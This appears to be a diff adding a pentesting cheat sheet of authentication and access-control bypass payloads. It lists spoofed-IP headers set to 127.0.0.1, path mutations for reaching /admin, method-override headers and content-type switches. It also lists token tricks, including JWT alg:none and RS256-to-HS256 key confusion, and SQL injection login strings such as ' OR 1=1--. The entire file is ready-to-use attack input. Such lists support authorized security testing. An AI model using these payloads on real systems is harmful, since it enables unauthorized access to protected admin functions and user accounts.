@@ -1,0 +1,43 @@
+# Header-based bypasses
+X-Forwarded-For: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Host: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+
+# Path traversal bypasses
+/admin → /ADMIN
+/admin → /admin/
+/admin → /admin/.
+/admin → //admin
+/admin → /./admin
+/admin → /admin..;/
+/admin → /%2fadmin
+/admin → /admin%20
+/admin → /admin%09
+/admin → /%61dmin
+
+# HTTP method overrides
+X-HTTP-Method-Override: PUT
+X-HTTP-Method: DELETE
+X-Method-Override: PATCH
+
+# Content-Type tricks
+application/json → application/x-www-form-urlencoded
+application/xml → application/json
+multipart/form-data with json body
+
+# Token manipulation
+Remove Authorization header entirely
+Change Bearer to bearer
+Add spaces: Bearer  <token>
+Use expired token from another user
+JWT alg:none bypass
+JWT key confusion (RS256 → HS256)
+Empty password field
+SQL injection in login: ' OR 1=1--
+admin' --
